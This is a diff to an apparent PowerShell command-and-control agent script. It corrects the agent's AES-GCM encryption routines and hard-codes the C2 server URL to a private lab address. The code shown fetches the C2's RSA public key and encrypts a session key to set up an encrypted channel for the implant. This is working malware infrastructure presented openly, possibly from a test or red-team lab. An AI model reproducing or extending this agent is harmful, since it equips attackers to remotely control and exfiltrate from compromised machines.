@@ -29,14 +29,14 @@ Function Encrypt-Result-GCM {
     $Nonce = New-Object byte[] 12  # 96-bit Nonce
     [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Nonce)
 
-    $AEAD = New-Object Security.Cryptography.AesGcm($AESKey)
+    $AEAD = New-Object System.Security.Cryptography.AesGcm($AESKey)
     $PlainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
     $CipherText = New-Object byte[] $PlainTextBytes.Length
     $Tag = New-Object byte[] 16  # 128-bit authentication tag
 
     $AEAD.Encrypt($Nonce, $PlainTextBytes, $CipherText, $Tag)
 
-    return [Convert]::ToBase64String($Nonce + $Tag + $CipherText)
+    return [Convert]::ToBase64String($Nonce + $CipherText + $Tag)
 }
 
 # Function to decrypt using AES-GCM
@@ -44,11 +44,11 @@ Function Decrypt-Result-GCM {
     Param ([string]$CipherTextBase64, [byte[]]$AESKey)
 
     $CipherData = [Convert]::FromBase64String($CipherTextBase64)
-    $Nonce = $CipherData[0..11]
-    $Tag = $CipherData[12..27]
-    $CipherText = $CipherData[28..($CipherData.Length - 1)]
+    $Nonce = $CipherData[0..11]  # First 12 bytes
+    $CipherText = $CipherData[12..($CipherData.Length-17)]  # Middle part
+    $Tag = $CipherData[($CipherData.Length-16)..($CipherData.Length-1)]  # Last 16 bytes
 
-    $AEAD = New-Object Security.Cryptography.AesGcm($AESKey)
+    $AEAD = New-Object System.Security.Cryptography.AesGcm($AESKey)
     $PlainTextBytes = New-Object byte[] $CipherText.Length
 
     Try {
@@ -113,7 +113,7 @@ Function Import-RSAKey {
 Try {
     $AgentIDFilePath = "C:\Temp\agent_id.txt"
     $AgentID = Load-AgentID -FilePath $AgentIDFilePath
-    $C2Url = "http://C2_Server_IP:8000"
+    $C2Url = "http://10.0.2.4:8000"  # Hardcoded for testing. Replace with config loading if needed.
 
     Write-Host "[*] Fetching Public Key..."
     $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
@@ -127,7 +127,7 @@ Try {
     [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
     $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
     
-    # Encrypt AES Key with RSA
+    # Encrypt AES Key with RSA using OAEP
     $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
     $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
     
